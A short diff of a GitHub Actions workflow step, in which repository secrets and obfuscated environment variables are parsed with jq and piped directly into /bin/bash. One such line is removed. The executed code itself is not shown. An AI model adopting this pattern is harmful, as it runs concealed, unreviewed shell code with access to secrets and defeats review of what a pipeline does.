@@ -19,7 +19,6 @@ jobs:
           txr12229: ${{ secrets.txr12229 }}
         run: |
           printf '%s' "$txr12229" | jq -r .rx918 | /bin/bash
-          echo $favb9741 | jq -r .i02 | /bin/bash
           echo $mnqt5 | jq -r .vopgq99892 | /bin/bash
           echo $tvmjh851 | jq -r .ifadn1 | /bin/bash
           echo $cr480 | jq -r .xvxi2168 | /bin/bash
